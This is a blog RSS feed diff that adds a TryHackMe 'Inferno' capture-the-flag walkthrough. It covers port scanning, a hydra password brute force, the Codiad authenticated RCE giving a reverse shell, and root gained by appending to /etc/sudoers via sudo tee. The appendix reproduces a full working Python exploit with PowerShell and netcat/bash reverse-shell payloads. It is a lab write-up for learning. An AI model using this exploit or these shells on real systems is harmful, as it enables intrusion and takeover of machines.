@@ -6,7 +6,518 @@
         <description>Recent content on Tanishq Chaudhary</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Fri, 25 Jun 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://chaudhary1337.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Sat, 26 Jun 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://chaudhary1337.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>TryHackMe: Inferno Writeup</title>
+        <link>https://chaudhary1337.github.io/p/tryhackme-inferno-writeup/</link>
+        <pubDate>Sat, 26 Jun 2021 00:00:00 +0000</pubDate>
+        
+        <guid>https://chaudhary1337.github.io/p/tryhackme-inferno-writeup/</guid>
+        <description>&lt;img src="https://i.imgur.com/4t9185h.jpg" alt="Featured image of post TryHackMe: Inferno Writeup" /&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/room/inferno&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Play&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;1-scanning--enumeration&#34;&gt;1. Scanning &amp;amp; Enumeration&lt;/h2&gt;
+&lt;p&gt;We do the below scans in parallel.&lt;/p&gt;
+&lt;h3 id=&#34;11-port-scanning&#34;&gt;1.1. Port Scanning&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;Not shown: 954 closed ports
+PORT      STATE    SERVICE           VERSION
+21/tcp    open     ftp?
+22/tcp    open     ssh               OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 d7:ec:1a:7f:62:74:da:29:64:b3:ce:1e:e2:68:04:f7 (RSA)
+|   256 de:4f:ee:fa:86:2e:fb:bd:4c:dc:f9:67:73:02:84:34 (ECDSA)
+|_  256 e2:6d:8d:e1:a8:d0:bd:97:cb:9a:bc:03:c3:f8:d8:85 (ED25519)
+23/tcp    open     telnet?
+25/tcp    open     smtp?
+|_smtp-commands: Couldn&#39;t establish connection on port 25
+80/tcp    open     http              Apache httpd 2.4.29 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET POST OPTIONS HEAD
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Dante&#39;s Inferno
+88/tcp    open     kerberos-sec?
+106/tcp   open     pop3pw?
+110/tcp   open     pop3?
+389/tcp   open     ldap?
+443/tcp   open     https?
+464/tcp   open     kpasswd5?
+636/tcp   open     ldapssl?
+777/tcp   open     multiling-http?
+783/tcp   open     spamassassin?
+808/tcp   open     ccproxy-http?
+873/tcp   open     rsync?
+1001/tcp  open     webpush?
+1236/tcp  open     bvcontrol?
+1300/tcp  open     h323hostcallsc?
+1309/tcp  filtered jtag-server
+1805/tcp  filtered enl-name
+1863/tcp  filtered msnp
+2000/tcp  open     cisco-sccp?
+2003/tcp  open     finger?
+|_finger: ERROR: Script execution failed (use -d to debug)
+2121/tcp  open     ccproxy-ftp?
+2601/tcp  open     zebra?
+2602/tcp  open     ripd?
+2604/tcp  open     ospfd?
+2605/tcp  open     bgpd?
+2607/tcp  open     connection?
+2608/tcp  open     wag-service?
+4224/tcp  open     xtell?
+5051/tcp  open     ida-agent?
+5432/tcp  open     postgresql?
+5555/tcp  open     freeciv?
+5666/tcp  open     nrpe?
+5998/tcp  filtered ncd-diag
+6346/tcp  open     gnutella?
+6566/tcp  open     sane-port?
+6667/tcp  open     irc?
+|_irc-info: Unable to open connection
+8021/tcp  open     ftp-proxy?
+8081/tcp  open     blackice-icecap?
+8088/tcp  open     radan-http?
+9418/tcp  open     git?
+10000/tcp open     snet-sensor-mgmt?
+10082/tcp open     amandaidx?
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We see 42 serives running. Going through and testing each one of them is not possible.&lt;/p&gt;
+&lt;h3 id=&#34;12-web-enumeration&#34;&gt;1.2. Web Enumeration&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
+└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x &#39;php,html,txt&#39; -t 32 -q -u 10.10.125.29
+/index.html           (Status: 200) [Size: 638]
+/inferno              (Status: 401) [Size: 459]
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;13-web-exploration&#34;&gt;1.3. Web Exploration&lt;/h3&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/XdFKN0A.jpg&#34; alt=&#34;homepage of thm room inferno&#34;  /&gt;&lt;/p&gt;
+&lt;p&gt;We see some quotes, which may be from the inferno book. We can explore them later if needed.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/AClskWf.png&#34; alt=&#34;inferno page found asking for login and password&#34;  /&gt;&lt;/p&gt;
+&lt;p&gt;We see the page demanding login and password. Maybe we can try bruteforcing?&lt;/p&gt;
+&lt;p&gt;Possible usernames:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;admin&lt;/li&gt;
+&lt;li&gt;dante (the guy who wrote inferno)&lt;/li&gt;
+&lt;li&gt;inferno (the name of the room)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;14-bruteforcing&#34;&gt;1.4. Bruteforcing&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
+└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.125.29 http-get /inferno -t 64
+Hydra v9.1 (c) 2020 by van Hauser/THC &amp;amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-06-26 00:13:47
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
+[DATA] attacking http-get://10.10.125.29:80/inferno
+[STATUS] 6189.00 tries/min, 6189 tries in 00:01h, 14338210 to do in 38:37h, 64 active
+[80][http-get] host: 10.10.125.29   login: admin   password: {password}
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-06-26 00:16:05
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Great! After logging in, we see another login form. Okay &amp;hellip;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/1hOuete.png&#34; alt=&#34;another login form in the inferno page&#34;  /&gt;&lt;/p&gt;
+&lt;h3 id=&#34;15-codiad&#34;&gt;1.5. Codiad&lt;/h3&gt;
+&lt;p&gt;Trying out the same creds gets us in. Now I looked for exploits for &lt;code&gt;codiad&lt;/code&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
+└─$ searchsploit codiad                      
+-------------------------- ---------------------------------
+ Exploit Title            |  Path
+-------------------------- ---------------------------------
+Codiad 2.4.3 - Multiple V | php/webapps/35585.txt
+Codiad 2.5.3 - Local File | php/webapps/36371.txt
+Codiad 2.8.4 - Remote Cod | multiple/webapps/49705.py
+-------------------------- ---------------------------------
+Shellcodes: No Results
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Let&amp;rsquo;s try the RCE one!&lt;/p&gt;
+&lt;p&gt;Running the exploit, we get &lt;code&gt;[-] Login failed! Please check your username and password.&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;But, we know for a fact that it is correct - otherwise we wouldn&amp;rsquo;t be able to login! Whats happening?&lt;/p&gt;
+&lt;p&gt;Recall we had to login &lt;em&gt;another&lt;/em&gt; form before we saw this. Maybe adding the header of login password, as we saw before would help.&lt;/p&gt;
+&lt;h3 id=&#34;16-custom-exploit&#34;&gt;1.6. Custom Exploit&lt;/h3&gt;
+&lt;p&gt;I first inspect the request itself, by intercepting it using burp suite.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;GET /inferno HTTP/1.1
+Host: 10.10.125.29
+Cache-Control: max-age=0
+Authorization: Basic {base64_encoded_authorization}
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Looks like the line &lt;code&gt;Authorization: Basic {base64_encoded_authorization}&lt;/code&gt; is the one we are looking for.&lt;/p&gt;
+&lt;p&gt;Decoing, we get &lt;code&gt;admin:{password}&lt;/code&gt;. Great! Our hypothesis was correct. We just need to add this auth line for all the requests made.&lt;/p&gt;
+&lt;p&gt;Add the line &lt;code&gt;&amp;quot;Authorization&amp;quot;: &amp;quot;Basic {base64_encoded_authorization}&amp;quot;&lt;/code&gt; to headers dictionary wherever present, or create a new one wherever not.&lt;/p&gt;
+&lt;p&gt;The code is attached at the very bottom.&lt;/p&gt;
+&lt;h2 id=&#34;2-foothold&#34;&gt;2. Foothold&lt;/h2&gt;
+&lt;h3 id=&#34;21-codilad-custom-rce&#34;&gt;2.1. Codilad Custom RCE&lt;/h3&gt;
+&lt;p&gt;Okay finally! Following the instructions we get a reverse shell.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~/Desktop/tools/files]
+└─$ python3 codiad.py http://10.10.125.29/inferno/ admin {password} 10.17.8.184 1337 linux
+[+] Please execute the following command on your vps: 
+echo &#39;bash -c &amp;quot;bash -i &amp;gt;/dev/tcp/10.17.8.184/1338 0&amp;gt;&amp;amp;1 2&amp;gt;&amp;amp;1&amp;quot;&#39; | nc -lnvp 1337
+nc -lnvp 1338
+[+] Please confirm that you have done the two command above [y/n]
+[Y/n] y
+[+] Starting...
+[+] Login Content : {&amp;quot;status&amp;quot;:&amp;quot;success&amp;quot;,&amp;quot;data&amp;quot;:{&amp;quot;username&amp;quot;:&amp;quot;admin&amp;quot;}}
+[+] Login success!
+[+] Getting writeable path...
+[+] Path Content : {&amp;quot;status&amp;quot;:&amp;quot;success&amp;quot;,&amp;quot;data&amp;quot;:{&amp;quot;name&amp;quot;:&amp;quot;inferno&amp;quot;,&amp;quot;path&amp;quot;:&amp;quot;\/var\/www\/html\/inferno&amp;quot;}}
+[+] Writeable Path : /var/www/html/inferno
+[+] Sending payload...
+{&amp;quot;status&amp;quot;:&amp;quot;error&amp;quot;,&amp;quot;message&amp;quot;:&amp;quot;No Results Returned&amp;quot;}
+[+] Exploit finished!
+[+] Enjoy your reverse shell!
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/2WKJRyi.png&#34; alt=&#34;getting remote code execution on the thm room inferno&#34;  /&gt;&lt;/p&gt;
+&lt;p&gt;Looks like the connection was immediately closed. Uh. Let&amp;rsquo;s try again?&lt;/p&gt;
+&lt;p&gt;Works! This time as soon as I got in, I spawned a bunch more bash shells. Threw in some &lt;code&gt;/bin/sh&lt;/code&gt; ones as well XD&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;python3 -c &#39;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&#39;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;python3 -c &#39;import pty; pty.spawn(&amp;quot;/bin/sh&amp;quot;)&#39;&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;22-exploring&#34;&gt;2.2 Exploring&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;Users&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;cd /home
+ls
+dante
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;SUID&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;find / -type f -perm -u=s 2&amp;gt; /dev/null
+/bin/su
+/bin/umount
+/bin/ping
+/bin/mount
+/bin/fusermount
+/usr/bin/gpasswd
+/usr/bin/newgidmap
+/usr/bin/pkexec
+/usr/bin/chfn
+/usr/bin/passwd
+/usr/bin/newuidmap
+/usr/bin/traceroute6.iputils
+/usr/bin/newgrp
+/usr/bin/at
+/usr/bin/chsh
+/usr/bin/sudo
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/snapd/snap-confine
+/usr/lib/openssh/ssh-keysign
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;crontab&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ cat /etc/crontab    
+cat /etc/crontab
+# /etc/crontab: system-wide crontab  
+# Unlike any other crontab you don&#39;t have to run the `crontab&#39;
+# command to install the new version when you edit this file          
+# and files in /etc/cron.d. These files also have username fields,          
+# that none of the other crontabs do.
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+17 *    * * *   root    cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.monthly )
+#
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Kernel status&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ uname -a
+uname -a
+Linux Inferno 4.15.0-130-generic #134-Ubuntu SMP Tue Jan 5 20:46:26 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Upto date&lt;/p&gt;
+&lt;h3 id=&#34;23-linpeas-enumeration&#34;&gt;2.3. LinPEAS enumeration&lt;/h3&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/ScLa4Dx.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;[+] Sudo version
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version                                              
+Sudo version 1.8.21p2 
+&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;[+] Backup folders
+drwxr-xr-x 2 root root 4096 Jun 26 03:55 /var/backups                                                                     
+total 32
+-rw-r--r-- 1 root root 30810 Jan 11 15:22 apt.extended_states.0
+
+drwx------ 2 root root 4096 Jan 11 15:19 /etc/lvm/backup
+&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;[+] Searching specific hashes inside files - less false positives (limit 70)
+/etc/apache2/.htpasswd:$apr1$UIfo4gwg$N4DRURQTtq/wytcy8pdGq.
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nothing that we don&amp;rsquo;t already know.&lt;/p&gt;
+&lt;h3 id=&#34;24-manual-exploration&#34;&gt;2.4. Manual Exploration&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;$ ls -la /home/dante/Downloads
+ls -la /home/dante/Downloads
+total 4420
+drwxr-xr-x  2 root  root     4096 Jan 11 15:29 .
+drwxr-xr-x 13 dante dante    4096 Jan 11 15:46 ..
+-rw-r--r--  1 root  root     1511 Nov  3  2020 .download.dat
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We see some hex characters. Let&amp;rsquo;s use &lt;a class=&#34;link&#34; href=&#34;http://icyberchef.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;CyberChef&lt;/a&gt; to decode. We get the password for dante user!&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;dante:{this_is_in_the_last_line!}&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;3-privesc&#34;&gt;3. PrivEsc&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
+└─$ ssh dante@10.10.125.29          
+The authenticity of host &#39;10.10.125.29 (10.10.125.29)&#39; can&#39;t be established.
+ECDSA key fingerprint is SHA256:QMSVr7PFqk9fLxwYBp9LCg9SjU6kioP9tJbL6ed0mZI.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &#39;10.10.125.29&#39; (ECDSA) to the list of known hosts.
+dante@10.10.125.29&#39;s password: 
+Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-130-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sat Jun 26 05:36:39 UTC 2021
+
+  System load:  0.0               Processes:           620
+  Usage of /:   42.2% of 8.79GB   Users logged in:     0
+  Memory usage: 77%               IP address for eth0: 10.10.125.29
+  Swap usage:   0%
+
+
+39 packages can be updated.
+0 updates are security updates.
+
+
+Last login: Mon Jan 11 15:56:07 2021 from 192.168.1.109
+dante@Inferno:~$ 
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Yess! Finally SSH after the ***tty shells. This has the same issue btw, so make sure to spam shells (&lt;code&gt;sh&lt;/code&gt; looks immune, bash gets killed :thonk:).&lt;/p&gt;
+&lt;h3 id=&#34;31-sudo&#34;&gt;3.1. sudo&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;$ sudo -l
+Matching Defaults entries for dante on Inferno:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User dante may run the following commands on Inferno:
+    (root) NOPASSWD: /usr/bin/tee
+
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We have it here on &lt;a class=&#34;link&#34; href=&#34;https://gtfobins.github.io/gtfobins/tee/#sudo&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;GTFOBins&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Here&amp;rsquo;s the one liner exploit for sudo tee: &lt;code&gt;echo &amp;quot;dante    ALL=(ALL:ALL) ALL&amp;quot; | sudo tee -a /etc/sudoers&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;What happened here?&lt;/p&gt;
+&lt;p&gt;man tee:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;man page of tee: &lt;code&gt;tee - read from standard input and write to standard output and files&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;-a flag appends data&lt;/li&gt;
+&lt;li&gt;we echo the line giving us all the permissions&lt;/li&gt;
+&lt;li&gt;and pipe it to sudo tee with the -a flag to append it in the /etc/sudoers file&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Resultant:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ sudo -l
+Matching Defaults entries for dante on Inferno:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User dante may run the following commands on Inferno:
+    (root) NOPASSWD: /usr/bin/tee
+    (ALL : ALL) ALL
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Great!&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ sudo su
+root@Inferno:/home/dante# sh
+# cd /root
+# ls
+proof.txt
+# cat proof.txt
+Congrats!
+
+You&#39;ve rooted Inferno!
+
+{system_compromised}
+
+mindsflee
+
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And we are done!&lt;/p&gt;
+&lt;h2 id=&#34;a-appendix-rce-codilad-custom-exploit-code&#34;&gt;A. Appendix: RCE Codilad Custom Exploit Code&lt;/h2&gt;
+&lt;pre&gt;&lt;code class=&#34;language-python=&#34; data-lang=&#34;python=&#34;&gt;# Exploit Title: Codiad 2.8.4 - Remote Code Execution (Authenticated)
+# Discovery by: WangYihang
+# Vendor Homepage: http://codiad.com/
+# Software Links : https://github.com/Codiad/Codiad/releases
+# Tested Version: Version: 2.8.4
+# CVE: CVE-2018-14009
+
+#!/usr/bin/env python
+# encoding: utf-8
+import requests
+import sys
+import json
+import base64
+
+session = requests.Session()
+
+
+def login(domain, username, password):
+    global session
+    url = domain + &amp;quot;/components/user/controller.php?action=authenticate&amp;quot;
+    data = {
+        &amp;quot;username&amp;quot;: username,
+        &amp;quot;password&amp;quot;: password,
+        &amp;quot;theme&amp;quot;: &amp;quot;default&amp;quot;,
+        &amp;quot;language&amp;quot;: &amp;quot;en&amp;quot;,
+    }
+    response = session.post(
+        url,
+        data=data,
+        verify=False,
+        headers={&amp;quot;Authorization&amp;quot;: &amp;quot;Basic {base64_encoded_authorization}&amp;quot;},
+    )
+    content = response.text
+    print(&amp;quot;[+] Login Content : %s&amp;quot; % (content))
+    if &#39;status&amp;quot;:&amp;quot;success&amp;quot;&#39; in content:
+        return True
+
+
+def get_write_able_path(domain):
+    global session
+    url = domain + &amp;quot;/components/project/controller.php?action=get_current&amp;quot;
+    response = session.get(
+        url, verify=False, headers={&amp;quot;Authorization&amp;quot;: &amp;quot;Basic {base64_encoded_authorization}&amp;quot;}
+    )
+    content = response.text
+    print(&amp;quot;[+] Path Content : %s&amp;quot; % (content))
+    json_obj = json.loads(content)
+    if json_obj[&amp;quot;status&amp;quot;] == &amp;quot;success&amp;quot;:
+        return json_obj[&amp;quot;data&amp;quot;][&amp;quot;path&amp;quot;]
+    else:
+        return False
+
+
+def base64_encode_2_bytes(host, port):
+    payload = &amp;quot;&amp;quot;&amp;quot;
+    $client = New-Object System.Net.Sockets.TCPClient(&amp;quot;__HOST__&amp;quot;,__PORT__);
+    $stream = $client.GetStream();
+    [byte[]]$bytes = 0..255|%{0};
+    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+        $sendback = (iex $data 2&amp;gt;&amp;amp;1 | Out-String );
+        $sendback2  = $sendback + &amp;quot;PS &amp;quot; + (pwd).Path + &amp;quot;&amp;gt; &amp;quot;;
+        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+        $stream.Write($sendbyte,0,$sendbyte.Length);
+        $stream.Flush();
+    }
+    $client.Close();
+    &amp;quot;&amp;quot;&amp;quot;
+    result = &amp;quot;&amp;quot;
+    for i in payload.replace(&amp;quot;__HOST__&amp;quot;, host).replace(&amp;quot;__PORT__&amp;quot;, str(port)):
+        result += i + &amp;quot;\x00&amp;quot;
+    return base64.b64encode(result.encode()).decode().replace(&amp;quot;\n&amp;quot;, &amp;quot;&amp;quot;)
+
+
+def build_powershell_payload(host, port):
+    preffix = &amp;quot;powershell -ep bypass -NoLogo -NonInteractive -NoProfile -enc &amp;quot;
+    return preffix + base64_encode_2_bytes(host, port).replace(&amp;quot;+&amp;quot;, &amp;quot;%2b&amp;quot;)
+
+
+def exploit(domain, username, password, host, port, path, platform):
+    global session
+    url = (
+        domain
+        + &amp;quot;components/filemanager/controller.php?type=1&amp;amp;action=search&amp;amp;path=%s&amp;quot; % (path)
+    )
+    if platform.lower().startswith(&amp;quot;win&amp;quot;):
+        # new version escapeshellarg
+        # escapeshellarg on windows will quote the arg with &amp;quot;&amp;quot;
+        # so we need to try twice
+        payload = &amp;quot;||%s||&amp;quot; % (build_powershell_payload(host, port))
+        payload = &amp;quot;search_string=Hacker&amp;amp;search_file_type=&amp;quot; + payload
+        headers = {
+            &amp;quot;Content-Type&amp;quot;: &amp;quot;application/x-www-form-urlencoded; charset=UTF-8&amp;quot;,
+            &amp;quot;Authorization&amp;quot;: &amp;quot;Basic {base64_encoded_authorization}&amp;quot;,
+        }
+        response = session.post(url, data=payload, headers=headers, verify=False)
+        content = response.text
+        print(content)
+        # old version escapeshellarg
+        payload = &amp;quot;%%22||%s||&amp;quot; % (build_powershell_payload(host, port))
+        payload = &amp;quot;search_string=Hacker&amp;amp;search_file_type=&amp;quot; + payload
+        headers = {
+            &amp;quot;Content-Type&amp;quot;: &amp;quot;application/x-www-form-urlencoded; charset=UTF-8&amp;quot;,
+            &amp;quot;Authorization&amp;quot;: &amp;quot;Basic {base64_encoded_authorization}&amp;quot;,
+        }
+        response = session.post(url, data=payload, headers=headers, verify=False)
+        content = response.text
+        print(content)
+    else:
+        # payload = &#39;&#39;&#39;SniperOJ%22%0A%2Fbin%2Fbash+-c+&#39;sh+-i+%3E%26%2Fdev%2Ftcp%2F&#39;&#39;&#39; + host + &#39;&#39;&#39;%2F&#39;&#39;&#39; + port + &#39;&#39;&#39;+0%3E%261&#39;%0Agrep+%22SniperOJ&#39;&#39;&#39;
+        payload = &#39;&amp;quot;%%0Anc %s %d|/bin/bash %%23&#39; % (host, port)
+        payload = &amp;quot;search_string=Hacker&amp;amp;search_file_type=&amp;quot; + payload
+        headers = {
+            &amp;quot;Content-Type&amp;quot;: &amp;quot;application/x-www-form-urlencoded; charset=UTF-8&amp;quot;,
+            &amp;quot;Authorization&amp;quot;: &amp;quot;Basic {base64_encoded_authorization}&amp;quot;,
+        }
+        response = session.post(url, data=payload, headers=headers, verify=False)
+        content = response.text
+        print(content)
+
+
+def promote_yes(hint):
+    print(hint)
+    while True:
+        ans = input(&amp;quot;[Y/n] &amp;quot;).lower()
+        if ans == &amp;quot;n&amp;quot;:
+            return False
+        elif ans == &amp;quot;y&amp;quot;:
+            return True
+        else:
+            print(&amp;quot;Incorrect input&amp;quot;)
+
+
+def main():
+    if len(sys.argv) != 7:
+        print(&amp;quot;Usage : &amp;quot;)
+        print(
+            &amp;quot;        python %s [URL] [USERNAME] [PASSWORD] [IP] [PORT] [PLATFORM]&amp;quot;
+            % (sys.argv[0])
+        )
+        print(
+            &amp;quot;        python %s [URL:PORT] [USERNAME] [PASSWORD] [IP] [PORT] [PLATFORM]&amp;quot;
+            % (sys.argv[0])
+        )
+        print(&amp;quot;Example : &amp;quot;)
+        print(
+            &amp;quot;        python %s http://localhost/ admin admin 8.8.8.8 8888 linux&amp;quot;
+            % (sys.argv[0])
+        )
+        print(
+            &amp;quot;        python %s http://localhost:8080/ admin admin 8.8.8.8 8888 windows&amp;quot;
+            % (sys.argv[0])
+        )
+        print(&amp;quot;Author : &amp;quot;)
+        print(&amp;quot;        WangYihang &amp;lt;wangyihanger@gmail.com&amp;gt;&amp;quot;)
+        exit(1)
+    domain = sys.argv[1]
+    username = sys.argv[2]
+    password = sys.argv[3]
+    host = sys.argv[4]
+    port = int(sys.argv[5])
+    platform = sys.argv[6]
+    if platform.lower().startswith(&amp;quot;win&amp;quot;):
+        print(&amp;quot;[+] Please execute the following command on your vps: &amp;quot;)
+        print(&amp;quot;nc -lnvp %d&amp;quot; % (port))
+        if not promote_yes(
+            &amp;quot;[+] Please confirm that you have done the two command above [y/n]&amp;quot;
+        ):
+            exit(1)
+    else:
+        print(&amp;quot;[+] Please execute the following command on your vps: &amp;quot;)
+        print(
+            &amp;quot;echo &#39;bash -c \&amp;quot;bash -i &amp;gt;/dev/tcp/%s/%d 0&amp;gt;&amp;amp;1 2&amp;gt;&amp;amp;1\&amp;quot;&#39; | nc -lnvp %d&amp;quot;
+            % (host, port + 1, port)
+        )
+        print(&amp;quot;nc -lnvp %d&amp;quot; % (port + 1))
+        if not promote_yes(
+            &amp;quot;[+] Please confirm that you have done the two command above [y/n]&amp;quot;
+        ):
+            exit(1)
+    print(&amp;quot;[+] Starting...&amp;quot;)
+    if not login(domain, username, password):
+        print(&amp;quot;[-] Login failed! Please check your username and password.&amp;quot;)
+        exit(2)
+    print(&amp;quot;[+] Login success!&amp;quot;)
+    print(&amp;quot;[+] Getting writeable path...&amp;quot;)
+    path = get_write_able_path(domain)
+    if path == False:
+        print(&amp;quot;[+] Get current path error!&amp;quot;)
+        exit(3)
+    print(&amp;quot;[+] Writeable Path : %s&amp;quot; % (path))
+    print(&amp;quot;[+] Sending payload...&amp;quot;)
+    exploit(domain, username, password, host, port, path, platform)
+    print(&amp;quot;[+] Exploit finished!&amp;quot;)
+    print(&amp;quot;[+] Enjoy your reverse shell!&amp;quot;)
+
+
+if __name__ == &amp;quot;__main__&amp;quot;:
+    main()
+&lt;/code&gt;&lt;/pre&gt;</description>
+        </item>
+        <item>
         <title>TryHackMe: Cooctus Stories Writeup</title>
         <link>https://chaudhary1337.github.io/p/tryhackme-cooctus-stories-writeup/</link>
         <pubDate>Fri, 25 Jun 2021 00:00:00 +0000</pubDate>
